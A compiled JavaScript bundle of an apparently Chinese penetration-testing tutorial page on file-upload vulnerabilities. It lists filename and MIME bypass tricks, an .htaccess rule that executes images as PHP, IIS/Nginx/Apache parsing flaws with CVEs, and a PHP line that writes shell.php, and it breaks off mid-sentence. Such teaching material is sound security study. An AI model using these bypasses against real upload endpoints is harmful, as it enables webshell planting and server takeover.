"use strict";(self.webpackChunkjsl_blog=self.webpackChunkjsl_blog||[]).push([[7369],{4122:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>h,contentTitle:()=>l,default:()=>a,frontMatter:()=>c,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"Penetration/\u2161.web\u6f0f\u6d1e/\u6587\u4ef6\u4e0a\u4f20/index","title":"**\u6587\u4ef6\u4e0a\u4f20**","description":"\u6f0f\u6d1e\u6210\u56e0","source":"@site/docs/Penetration/\u2161.web\u6f0f\u6d1e/\u6587\u4ef6\u4e0a\u4f20/index.md","sourceDirName":"Penetration/\u2161.web\u6f0f\u6d1e/\u6587\u4ef6\u4e0a\u4f20","slug":"/Penetration/\u2161.web\u6f0f\u6d1e/\u6587\u4ef6\u4e0a\u4f20/","permalink":"/docs/Penetration/\u2161.web\u6f0f\u6d1e/\u6587\u4ef6\u4e0a\u4f20/","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":0,"frontMatter":{"sidebar_position":0,"sidebar_label":"\u6587\u4ef6\u4e0a\u4f20","sidebar_class_name":"green"},"sidebar":"Penetration_Sidebar","previous":{"title":"shiro","permalink":"/docs/Penetration/\u2161.web\u6f0f\u6d1e/\u5e38\u89c1web\u6846\u67b6\u6f0f\u6d1e/shiro/"},"next":{"title":"\u6587\u4ef6\u5305\u542b","permalink":"/docs/Penetration/\u2161.web\u6f0f\u6d1e/\u6587\u4ef6\u5305\u542b/"}}');var i=r(4848),d=r(8453);const c={sidebar_position:0,sidebar_label:"\u6587\u4ef6\u4e0a\u4f20",sidebar_class_name:"green"},l="\u6587\u4ef6\u4e0a\u4f20",h={},o=[{value:"\u6f0f\u6d1e\u6210\u56e0",id:"\u6f0f\u6d1e\u6210\u56e0",level:3},{value:"\u7ed5\u8fc7\u65b9\u5f0f",id:"\u7ed5\u8fc7\u65b9\u5f0f",level:3},{value:"\u524d\u7aef\u9a8c\u8bc1\u7ed5\u8fc7",id:"\u524d\u7aef\u9a8c\u8bc1\u7ed5\u8fc7",level:5},{value:"\u540e\u7aefMIME\u7c7b\u578b\u68c0\u6d4b\u7ed5\u8fc7",id:"\u540e\u7aefmime\u7c7b\u578b\u68c0\u6d4b\u7ed5\u8fc7",level:5},{value:"\u9ed1\u540d\u5355\uff08\u4e0a\u4f20\u5185\u5bb9\u53ea\u8981\u4e0d\u5728\u9ed1\u540d\u5355\u5c31\u884c\uff09",id:"\u9ed1\u540d\u5355\u4e0a\u4f20\u5185\u5bb9\u53ea\u8981\u4e0d\u5728\u9ed1\u540d\u5355\u5c31\u884c",level:5},{value:"\u767d\u540d\u5355\uff08\u76f8\u8f83\u6bd4\u9ed1\u540d\u5355\u96be\u7ed5\uff0c\u53ea\u5141\u8bb8\u89c4\u5b9a\u5728\u767d\u540d\u5355\u7684\u5185\u5bb9\u624d\u80fd\u4e0a\u4f20\uff09",id:"\u767d\u540d\u5355\u76f8\u8f83\u6bd4\u9ed1\u540d\u5355\u96be\u7ed5\u53ea\u5141\u8bb8\u89c4\u5b9a\u5728\u767d\u540d\u5355\u7684\u5185\u5bb9\u624d\u80fd\u4e0a\u4f20",level:5},{value:"\u6761\u4ef6\u7ade\u4e89",id:"\u6761\u4ef6\u7ade\u4e89",level:5},{value:"\u6587\u4ef6\u5934\u7ed5\u8fc7\uff08\u68c0\u6d4b\u6587\u4ef6\u5934\uff09",id:"\u6587\u4ef6\u5934\u7ed5\u8fc7\u68c0\u6d4b\u6587\u4ef6\u5934",level:5},{value:".user.ini\u6587\u4ef6",id:"userini\u6587\u4ef6",level:5},{value:"\u4e8c\u6b21\u6e32\u67d3",id:"\u4e8c\u6b21\u6e32\u67d3",level:5},{value:"\u7f16\u8f91\u5668\u6f0f\u6d1e",id:"\u7f16\u8f91\u5668\u6f0f\u6d1e",level:5},{value:"\u5229\u7528 windows \u73af\u5883\u7684\u53e0\u52a0\u7279\u5f81\u7ed5\u8fc7",id:"\u5229\u7528-windows-\u73af\u5883\u7684\u53e0\u52a0\u7279\u5f81\u7ed5\u8fc7",level:5},{value:"\u6f0f\u6d1e\u4fee\u590d",id:"\u6f0f\u6d1e\u4fee\u590d",level:3},{value:"webshell\u7ba1\u7406\u5de5\u5177",id:"webshell\u7ba1\u7406\u5de5\u5177",level:3},{value:"\u53c2\u8003\u6587\u7ae0",id:"\u53c2\u8003\u6587\u7ae0",level:3}];function p(e){const n={a:"a",code:"code",h1:"h1",h3:"h3",h5:"h5",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,d.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"\u6587\u4ef6\u4e0a\u4f20",children:(0,i.jsx)(n.strong,{children:"\u6587\u4ef6\u4e0a\u4f20"})})}),"\n",(0,i.jsx)(n.h3,{id:"\u6f0f\u6d1e\u6210\u56e0",children:"\u6f0f\u6d1e\u6210\u56e0"}),"\n",(0,i.jsx)(n.p,{children:"\u653b\u51fb\u8005\u901a\u8fc7\u7f51\u9875\u4e2d\u7684\u4e00\u4e9b\u6ca1\u6709\u505a\u8fc7\u6ee4\u6216\u8005\u8fc7\u6ee4\u4e0d\u8db3\u7684\u6587\u4ef6\u4e0a\u4f20\u70b9\uff0c\u901a\u8fc7\u4e00\u4e9b\u7279\u6b8a\u6784\u9020\u65b9\u5f0f\u8fdb\u884c\u7ed5\u8fc7\uff0c\u5e76\u5c06\u6728\u9a6c\u6216\u8005\u4e00\u4e9b\u7279\u6b8a\u6587\u4ef6\u901a\u8fc7\u4e0a\u4f20\u70b9\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\u4e0a\uff0c\u4ece\u800c\u83b7\u53d6webshell\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u6743\u9650\u88ab\u83b7\u53d6\uff0c\u670d\u52a1\u5668\u4e2d\u5185\u5bb9\u88ab\u6cc4\u9732\uff1b\u751a\u81f3\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u8005\u5229\u7528\u5f97\u5230\u7684webshell\u63d0\u5347\u81f3\u66f4\u9ad8\u6743\u9650\u7684shell\uff0c\u4f7f\u5f97\u670d\u52a1\u5668\u88ab\u653b\u51fb\u8005\u63a7\u5236\u4f7f\u7528\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u9700\u6ee1\u8db3\u7684\u6761\u4ef6\uff1a\u4e0a\u4f20\u7684\u6728\u9a6c\u6587\u4ef6\u6240\u4f7f\u7528\u7684\u8bed\u8a00\u5728\u670d\u52a1\u5668\u8981\u6709\u73af\u5883\u53bb\u8fd0\u884c\uff1b\u4e0a\u4f20\u7684\u6587\u4ef6\u8981\u6709\u53ef\u6267\u884c\u7684\u6743\u9650\uff1b\u5df2\u77e5\u4e0a\u4f20\u540e\u7684\u6587\u4ef6\u4f4d\u7f6e\u548c\u6587\u4ef6\u540d\uff1b\u8bc6\u522b\u8bed\u8a00\u7c7b\u578bphp/asp/jsp/aspx\u3002"}),"\n",(0,i.jsx)(n.h3,{id:"\u7ed5\u8fc7\u65b9\u5f0f",children:"\u7ed5\u8fc7\u65b9\u5f0f"}),"\n",(0,i.jsx)(n.h5,{id:"\u524d\u7aef\u9a8c\u8bc1\u7ed5\u8fc7",children:"\u524d\u7aef\u9a8c\u8bc1\u7ed5\u8fc7"}),"\n",(0,i.jsxs)(n.p,{children:["\u76f4\u63a5\u7981\u7528\u6216\u8005\u5220\u9664",(0,i.jsx)(n.code,{children:"js"})]}),"\n",(0,i.jsx)(n.h5,{id:"\u540e\u7aefmime\u7c7b\u578b\u68c0\u6d4b\u7ed5\u8fc7",children:"\u540e\u7aefMIME\u7c7b\u578b\u68c0\u6d4b\u7ed5\u8fc7"}),"\n",(0,i.jsxs)(n.p,{children:["bp\u6293\u5305\u540e\u4fee\u6539\u8bf7\u6c42\u5934\u4e0a\u7684",(0,i.jsx)(n.code,{children:"Content-Type"}),"\u503c\uff08\u4f8b\uff1a",(0,i.jsx)(n.code,{children:"image/jpeg"}),"\uff09"]}),"\n",(0,i.jsx)(n.h5,{id:"\u9ed1\u540d\u5355\u4e0a\u4f20\u5185\u5bb9\u53ea\u8981\u4e0d\u5728\u9ed1\u540d\u5355\u5c31\u884c",children:"\u9ed1\u540d\u5355\uff08\u4e0a\u4f20\u5185\u5bb9\u53ea\u8981\u4e0d\u5728\u9ed1\u540d\u5355\u5c31\u884c\uff09"}),"\n",(0,i.jsxs)(n.p,{children:["1.\u76f8\u4f3c\u6269\u5c55\u540d",(0,i.jsx)(n.code,{children:".php4"}),"\u3001",(0,i.jsx)(n.code,{children:".php5"}),"\u3001",(0,i.jsx)(n.code,{children:".phtm"}),"\u7b49"]}),"\n",(0,i.jsxs)(n.p,{children:["2.",(0,i.jsx)(n.code,{children:"apache"}),"\u7684\u914d\u7f6e\u6587\u4ef6",(0,i.jsx)(n.code,{children:".htaccess"}),"\uff0c\u901a\u8fc7\u4e0a\u4f20",(0,i.jsx)(n.code,{children:".htaccess"}),"\u5c06",(0,i.jsx)(n.code,{children:"jpg"}),"\u540e\u7f00\u6587\u4ef6\u89e3\u6790\u4e3a",(0,i.jsx)(n.code,{children:"php"}),"\u4ee3\u7801"]}),"\n",(0,i.jsxs)(n.p,{children:["\u6ce8\uff1a",(0,i.jsx)(n.code,{children:".htaccess"})," \u9ed8\u8ba4\u4e0d\u652f\u6301 ",(0,i.jsx)(n.code,{children:"nginx"}),"\uff0c\u8bbe\u7f6e\u540e\u652f\u6301,\u9ed8\u8ba4\u652f\u6301",(0,i.jsx)(n.code,{children:"Apache"}),"\uff0c",(0,i.jsx)(n.code,{children:".htaccess"})," \u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u5b9e\u73b0",(0,i.jsx)(n.code,{children:"nginx"}),"\u6587\u4ef6\u89e3\u6790\u914d\u7f6e\uff0c\u5c06",(0,i.jsx)(n.code,{children:".png"})," \u540e\u7f00\u7684\u6587\u4ef6\u89e3\u6790\u6210 ",(0,i.jsx)(n.code,{children:"php"}),"\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'#\u5c06jpg\u540e\u7f00\u7684\u6587\u4ef6\u5f53\u505aphp\u6765\u6267\u884c\r\nAddType application/x-httpd-php .jpg\r\n\r\n#\u5c06\u6240\u6709\u540d\u5b57\u91cc\u542b\u6709shell\u7684\u6587\u4ef6\u5f53\u505aphp\u6765\u6267\u884c\r\n<FilesMatch "shell">\r\nSetHandler application/x-httpd-php\r\n</FilesMatchc>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["3.\u540e\u7f00\u5927\u5c0f\u5199\u7ed5\u8fc7\uff08",(0,i.jsx)(n.code,{children:"Php,PHP,pHp"}),"\u7b49\uff09\uff0c\u5728 ",(0,i.jsx)(n.code,{children:"PHP"})," \u73af\u5883\u4e0b\uff0c\u670d\u52a1\u5668\u9ed8\u8ba4\u662f\u4e0d\u533a\u5206\u6587\u4ef6\u540d\u5927\u5c0f\u5199\u7684\uff08\u5728 ",(0,i.jsx)(n.code,{children:"Windows"})," \u7cfb\u7edf\u4e0b\u66f4\u662f\u5982\u6b64\uff09"]}),"\n",(0,i.jsxs)(n.p,{children:["4.\u7a7a\u683c\u7ed5\u8fc7\uff08",(0,i.jsx)(n.code,{children:"shell.php "})," \uff09\uff0c\u5728 ",(0,i.jsx)(n.code,{children:"Windows"})," \u7cfb\u7edf\u4e2d\uff0c\u4fdd\u5b58\u6587\u4ef6\u65f6\u4f1a\u81ea\u52a8\u53bb\u9664\u6587\u4ef6\u540d\u672b\u5c3e\u7684\u7a7a\u683c\uff0c\u800c\u9ed1\u540d\u5355\u4e2d\u901a\u5e38\u4e0d\u4f1a\u5305\u542b\u5e26\u7a7a\u683c\u7684\u540e\u7f00"]}),"\n",(0,i.jsxs)(n.p,{children:["5.\u52a0\u70b9\u7ed5\u8fc7\uff08",(0,i.jsx)(n.code,{children:"shell.php."}),"\uff09\uff0c\u5728 ",(0,i.jsx)(n.code,{children:"Windows"})," \u7cfb\u7edf\u4e0b\uff0c\u6587\u4ef6\u540d\u6700\u540e\u4e00\u4e2a\u70b9\u4f1a\u88ab\u81ea\u52a8\u5ffd\u7565"]}),"\n",(0,i.jsxs)(n.p,{children:["6.",(0,i.jsx)(n.code,{children:"::$DATA"}),"\u7ed5\u8fc7\uff0c",(0,i.jsx)(n.code,{children:"shell.php::$DATA"}),"\uff0c\u5229\u7528",(0,i.jsx)(n.code,{children:"windows"}),"\u4e0b\u7684",(0,i.jsx)(n.code,{children:"NTFS"}),"\u6587\u4ef6\u7cfb\u7edf\u7684\u4e00\u4e2a\u7279\u6027\uff1b\u670d\u52a1\u5668\u68c0\u6d4b\u65f6\uff0c\u53ef\u80fd\u4f1a\u5c06",(0,i.jsx)(n.code,{children:"::$DATA"}),"\u89c6\u4e3a\u975e\u6cd5\u5b57\u7b26\u800c\u4e0d\u8fdb\u884c\u4e25\u683c\u68c0\u67e5\uff0c\u4f46 ",(0,i.jsx)(n.code,{children:"Windows"})," \u7cfb\u7edf\u4f1a\u6b63\u786e\u5904\u7406\u8fd9\u4e2a\u6587\u4ef6\u540d\uff0c\u5c06\u5176\u4fdd\u5b58\u4e3a",(0,i.jsx)(n.code,{children:"shell.php"}),"\uff0c\u5f53\u6211\u4eec\u8bbf\u95ee",(0,i.jsx)(n.code,{children:"shell.php::$data"}),"\u5c31\u76f8\u5f53\u4e8e\u8bf7\u6c42",(0,i.jsx)(n.code,{children:"shell.php"}),"\uff1b"]}),"\n",(0,i.jsxs)(n.p,{children:["7.\u70b9\u7a7a\u70b9\uff08. .\uff09\u7ed5\u8fc7\uff0c",(0,i.jsx)(n.code,{children:"shell.php. ."}),"\uff0c\u9002\u7528\u4e8e\u9ed1\u540d\u5355\u4ec5\u8fc7\u6ee4\u4e00\u6b21"]}),"\n",(0,i.jsxs)(n.p,{children:["8.\u53cc\u5199\u7ed5\u8fc7\uff0c",(0,i.jsx)(n.code,{children:"shell.phphpp"}),"\uff0c\u9002\u7528\u4e8e\u9ed1\u540d\u5355\u4f1a\u68c0\u6d4b\u5220\u9664",(0,i.jsx)(n.code,{children:"php"}),"\u540e\u7f00"]}),"\n",(0,i.jsx)(n.p,{children:"9.\u89e3\u6790\u6f0f\u6d1e\u5229\u7528\u7ed5\u8fc7"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"apache"}),"\u89e3\u6790\u6f0f\u6d1e"]}),"\n",(0,i.jsxs)(n.p,{children:["\u89e3\u6790\u65f6\uff0c\u5982\u679c\u9047\u5230\u4e0d\u8ba4\u8bc6\u7684\u540e\u7f00\u4f1a\u4ece\u53f3\u5f80\u5de6\u7ee7\u7eed\u5224\u65ad\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020",(0,i.jsx)(n.code,{children:"shell.php.swp.xzh"}),"\uff0c",(0,i.jsx)(n.code,{children:"apache"}),"\u4f1a\u4e00\u76f4\u5f80\u5de6\u89e3\u6790\u76f4\u5230\u89e3\u6790\u5230",(0,i.jsx)(n.code,{children:"php"}),"\uff0c\u5c06\u6587\u4ef6\u8bc6\u522b\u4e3a",(0,i.jsx)(n.code,{children:"php"}),"\u6587\u4ef6\u8fdb\u884c\u6267\u884c\uff0c\u4f46\u662f\u6587\u4ef6\u540e\u7f00\u4e3a",(0,i.jsx)(n.code,{children:"xzh"}),"\u4ece\u800c\u7ed5\u8fc7\u9ed1\u540d\u5355\uff1b"]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"Apache HTTPD"})," \u6362\u884c\u89e3\u6790\u6f0f\u6d1e\uff08",(0,i.jsx)(n.code,{children:"CVE-2017-15715"}),"\uff09",(0,i.jsx)(n.code,{children:"apache"})," \u901a\u8fc7 ",(0,i.jsx)(n.code,{children:"mod_php"})," \u6765\u8fd0\u884c\u811a\u672c\uff0c\u5176 ",(0,i.jsx)(n.code,{children:"2.4.0-2.4.29"})," \u4e2d\u5b58\u5728 ",(0,i.jsx)(n.code,{children:"apache"})," \u6362\u884c\u89e3\u6790\u6f0f\u6d1e\uff0c\u5728\u89e3\u6790 ",(0,i.jsx)(n.code,{children:"php"})," \u65f6 ",(0,i.jsx)(n.code,{children:"xxx.php\\x0A"})," \u5c06\u88ab\u6309\u7167 ",(0,i.jsx)(n.code,{children:"PHP"})," \u540e\u7f00\u8fdb\u884c\u89e3\u6790\uff0c\u5bfc\u81f4\u7ed5\u8fc7\u4e00\u4e9b\u670d\u52a1\u5668\u7684\u5b89\u5168\u7b56\u7565"]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"IIS"}),"\u89e3\u6790\u6f0f\u6d1e"]}),"\n",(0,i.jsxs)(n.p,{children:["\u76ee\u5f55\u89e3\u6790\u6f0f\u6d1e(",(0,i.jsx)(n.code,{children:"/test.asp/1.jpg"}),")"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5728 ",(0,i.jsx)(n.code,{children:"IIS5.x/6.0"})," \u4e2d\uff0c\u5728\u7f51\u7ad9\u4e0b\u5efa\u7acb\u6587\u4ef6\u5939\u7684\u540d\u5b57\u4e3a",(0,i.jsx)(n.code,{children:"*.asp\u3001*.asa\u3001*.cer\u3001*.cdx"})," \u7684\u6587\u4ef6\u5939\uff0c\u90a3\u4e48\u5176\u76ee\u5f55\u5185\u7684\u4efb\u4f55\u6269\u5c55\u540d\u7684\u6587\u4ef6\u90fd\u4f1a\u88ab",(0,i.jsx)(n.code,{children:"IIS"}),"\u5f53\u505a",(0,i.jsx)(n.code,{children:"asp"}),"\u6587\u4ef6\u6765\u89e3\u91ca\u5e76\u6267\u884c\u3002\u4f8b\u5982\u521b\u5efa\u76ee\u5f55 ",(0,i.jsx)(n.code,{children:"test.asp"}),"\uff0c\u90a3\u4e48 ",(0,i.jsx)(n.code,{children:"/test.asp/1.jpg"})," \u5c06\u88ab\u5f53\u505a",(0,i.jsx)(n.code,{children:"asp"}),"\u6587\u4ef6\u6765\u6267\u884c\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["\u6587\u4ef6\u540d\u89e3\u6790\u6f0f\u6d1e(",(0,i.jsx)(n.code,{children:"test.asp;.jpg"}),")"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5728 ",(0,i.jsx)(n.code,{children:"IIS5.x/6.0"})," \u4e2d\uff0c \u5206\u53f7\u540e\u9762\u7684\u4e0d\u88ab\u89e3\u6790\uff0c\u4e5f\u5c31\u662f\u8bf4 ",(0,i.jsx)(n.code,{children:"test.asp;.jpg"})," \u4f1a\u88ab\u670d\u52a1\u5668\u770b\u6210\u662f",(0,i.jsx)(n.code,{children:"test.asp"}),"\u3002\u8fd8\u6709",(0,i.jsx)(n.code,{children:"IIS6.0"}),"\u9ed8\u8ba4\u7684\u53ef\u6267\u884c\u6587\u4ef6\u9664\u4e86",(0,i.jsx)(n.code,{children:"asp"}),"\u8fd8\u5305\u542b\u8fd9\u4e24\u79cd ",(0,i.jsx)(n.code,{children:".asa  .cer"})," \u3002\u800c\u6709\u4e9b\u7f51\u7ad9\u5bf9\u7528\u6237\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u6821\u9a8c\uff0c\u53ea\u662f\u6821\u9a8c\u5176\u540e\u7f00\u540d\u3002\u6240\u4ee5\u6211\u4eec\u53ea\u8981\u4e0a\u4f20 ",(0,i.jsx)(n.code,{children:".asp;.jpg\u3001.asa;.jpg\u3001.cer;.jpg"})," \u540e\u7f00\u7684\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u670d\u52a1\u5668\u6821\u9a8c\uff0c\u5e76\u4e14\u670d\u52a1\u5668\u4f1a\u628a\u5176\u5f53\u6210",(0,i.jsx)(n.code,{children:"asp"}),"\u6587\u4ef6\u6267\u884c\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["\u7578\u5f62\u89e3\u6790\u6f0f\u6d1e(",(0,i.jsx)(n.code,{children:"test.jpg/*.php"}),")"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5728 ",(0,i.jsx)(n.code,{children:"IIS7.0"}),"\u4e2d\uff0c\u5728\u9ed8\u8ba4",(0,i.jsx)(n.code,{children:"Fast-CGI"}),"\u5f00\u542f\u72b6\u51b5\u4e0b\uff0c\u4e0a\u4f20\u56fe\u7247\u9a6c\u540e\u8bbf\u95ee",(0,i.jsx)(n.code,{children:"test.jpg/*.php"}),"\u4f1a\u5c06\u5176\u5f53\u4f5c",(0,i.jsx)(n.code,{children:"php"}),"\u6587\u4ef6\u8fdb\u884c\u6267\u884c\uff0c\u6211\u4eec\u5728\u56fe\u7247\u9a6c\u4e2d\u5199\u5165\u5982\u4e0b\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u5c31\u80fd\u5728\u5176\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a",(0,i.jsx)(n.code,{children:"shell.php"}),"\uff0c\u4ece\u800c\u62ff\u5230",(0,i.jsx)(n.code,{children:"shell"}),"\uff1b\u4f46\u662f\u53ea\u8981\u8bbe\u7f6e ",(0,i.jsx)(n.code,{children:"cgi.fix_pathinfo"}),"\u4e3a0\u5c31\u4e0d\u80fd\u4f7f\u7528\u8fd9\u4e2a\u6f0f\u6d1e"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>'); ?>\n"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"Nginx"}),"\u89e3\u6790\u6f0f\u6d1e"]}),"\n",(0,i.jsxs)(n.p,{children:["\u7578\u5f62\u89e3\u6790\u6f0f\u6d1e(",(0,i.jsx)(n.code,{children:"test.jpg/*.php"}),")"]}),"\n",(0,i.jsxs)(n.p,{children:["\u4e0e\u4e0a\u9762",(0,i.jsx)(n.code,{children:"IIS"}),"\u540c\u7406\uff0c",(0,i.jsx)(n.code,{children:"Nginx"}),"\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u4e0a\u4f20\u56fe\u7247\u9a6c\u540e\u8bbf\u95ee",(0,i.jsx)(n.code,{children:"test.jpg/*.php"}),"\u4f1a\u5c06\u5176\u5f53\u4f5c",(0,i.jsx)(n.code,{children:"php"}),"\u6587\u4ef6\u8fdb\u884c\u6267\u884c\uff0c\u6211\u4eec\u5728\u56fe\u7247\u9a6c\u4e2d\u5199\u5165\u5982\u4e0b\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u5c31\u80fd\u5728\u5176\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a",(0,i.jsx)(n.code,{children:"shell.php"}),"\uff0c\u4ece\u800c\u62ff\u5230",(0,i.jsx)(n.code,{children:"shell"}),"\uff1b\u56e0\u4e3a",(0,i.jsx)(n.code,{children:"cgi.fix_pathinfo"}),"\u662fphp\u4e2d\u7684\u53c2\u6570\uff0c\u9ed8\u8ba4\u662f\u5f00\u542f\u4e3a1\u7684\u72b6\u6001\uff1b\u4f46\u5728\u9ad8\u7248\u672c\u7684",(0,i.jsx)(n.code,{children:"php"}),"\u4e2d\uff0c\u7531\u4e8e",(0,i.jsx)(n.code,{children:"security.limit_extensions"})," \u7684\u5f15\u5165\uff0c\u4f7f\u5f97\u8be5\u6f0f\u6d1e\u96be\u4ee5\u88ab\u6210\u529f\u5229\u7528\uff0c\u4f4e\u7248\u672c",(0,i.jsx)(n.code,{children:"php"}),"\u4e2d\u53ea\u8981\u8bbe\u7f6e ",(0,i.jsx)(n.code,{children:"cgi.fix_pathinfo"}),"\u4e3a0\u5c31\u4e0d\u80fd\u4f7f\u7528\u8fd9\u4e2a\u6f0f\u6d1e"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>'); ?>\n"})}),"\n",(0,i.jsx)(n.p,{children:"%00\u7a7a\u5b57\u8282\u4ee3\u7801\u89e3\u6790\u6f0f\u6d1e"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"Ngnix"}),"\u5728\u9047\u5230",(0,i.jsx)(n.code,{children:"%00"}),"\u7a7a\u5b57\u8282\u65f6\u4e0e\u540e\u7aef",(0,i.jsx)(n.code,{children:"FastCGI"}),"\u5904\u7406\u4e0d\u4e00\u81f4\uff0c\u5bfc\u81f4\u53ef\u4ee5\u5728\u56fe\u7247\u4e2d\u5d4c\u5165",(0,i.jsx)(n.code,{children:"PHP"}),"\u4ee3\u7801\u7136\u540e\u901a\u8fc7\u8bbf\u95ee",(0,i.jsx)(n.code,{children:"xxx.jpg%00.php"}),"\u6765\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801"]}),"\n",(0,i.jsx)(n.p,{children:"\u5728\u4ee5\u4e0b\u7248\u672c\u7684nginx\u4e2d\uff0c\u6211\u4eec\u5728\u56fe\u7247\u4e2d\u5d4c\u5165PHP\u4ee3\u7801\u7136\u540e\u901a\u8fc7\u8bbf\u95ee xxx.jpg%00.php \u6765\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:" Nginx 0.5.*\r\n\r\n Nginx 0.6.*\r\n\r\n Nginx 0.7 <= 0.7.65\r\n\r\n Nginx 0.8 <= 0.8.37\n"})}),"\n",(0,i.jsx)(n.p,{children:"CVE-2013-4547(%20%00)"}),"\n",(0,i.jsx)(n.p,{children:"\u5f71\u54cdnginx\u7248\u672c\uff1anginx 0.8.41 ~ 1.5.6"}),"\n",(0,i.jsxs)(n.p,{children:["\u975e\u6cd5\u5b57\u7b26\u7a7a\u683c\uff08%20\uff09\u548c\u622a\u6b62\u7b26\uff08%00\uff09\u4f1a\u5bfc\u81f4",(0,i.jsx)(n.code,{children:"Nginx"}),"\u89e3\u6790",(0,i.jsx)(n.code,{children:"URL"}),"\u65f6\u7684\u6709\u9650\u72b6\u6001\u673a\u6df7\u4e71\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u901a\u8fc7\u4e00\u4e2a\u975e\u7f16\u7801\u7a7a\u683c\u7ed5\u8fc7\u540e\u7f00\u540d\u9650\u5236\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"http://x.x.x.x/test.jpgAAAphp \r\n\u5c06\u7b2c\u4e00\u4e2a\u201cA\u201d\u6539\u6210\u201c20\u201d\uff08\u7a7a\u683c\u7b26\u53f7\u7684ASCII\u7801\uff09\uff0c\u5c06\u7b2c\u4e8c\u4e2a\u201cA\u201d\u6539\u6210\u201c00\u201d\uff08\u622a\u6b62\u7b26\uff09\uff0c\u5c06\u7b2c\u4e09\u4e2a\u201cA\u201d\u6539\u6210\u201c2e\u201d\uff08\u201c.\u201d\u7684ASCII\u7801\uff09\n"})}),"\n",(0,i.jsx)(n.h5,{id:"\u767d\u540d\u5355\u76f8\u8f83\u6bd4\u9ed1\u540d\u5355\u96be\u7ed5\u53ea\u5141\u8bb8\u89c4\u5b9a\u5728\u767d\u540d\u5355\u7684\u5185\u5bb9\u624d\u80fd\u4e0a\u4f20",children:"\u767d\u540d\u5355\uff08\u76f8\u8f83\u6bd4\u9ed1\u540d\u5355\u96be\u7ed5\uff0c\u53ea\u5141\u8bb8\u89c4\u5b9a\u5728\u767d\u540d\u5355\u7684\u5185\u5bb9\u624d\u80fd\u4e0a\u4f20\uff09"}),"\n",(0,i.jsx)(n.p,{children:"1.%00\u622a\u65ad"}),"\n",(0,i.jsxs)(n.p,{children:["\u653b\u51fb\u8005\u4e0a\u4f20\u6587\u4ef6 ",(0,i.jsx)(n.code,{children:"shell.php%00.jpg"}),"\uff0c\u670d\u52a1\u5668\u5728\u5904\u7406\u6587\u4ef6\u540d\u65f6\uff0c\u53ef\u80fd\u4f1a\u5c06\u6587\u4ef6\u540d\u622a\u65ad\u4e3a ",(0,i.jsx)(n.code,{children:"shell.php"}),"\uff0c\u56e0\u4e3a\u5b83\u5728 ",(0,i.jsx)(n.code,{children:"%00"})," \u5b57\u7b26\u5904\u505c\u6b62\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u670d\u52a1\u5668\u53ea\u68c0\u67e5\u6587\u4ef6\u540d\u7684\u6269\u5c55\u540d\u90e8\u5206\uff08\u5373 ",(0,i.jsx)(n.code,{children:".jpg"}),"\uff09\uff0c\u5b83\u53ef\u80fd\u4f1a\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u56fe\u7247\u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u4fdd\u5b58\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u7531\u4e8e\u6587\u4ef6\u540d\u88ab\u622a\u65ad\uff0c\u5b9e\u9645\u4e0a\u4fdd\u5b58\u7684\u6587\u4ef6\u662f 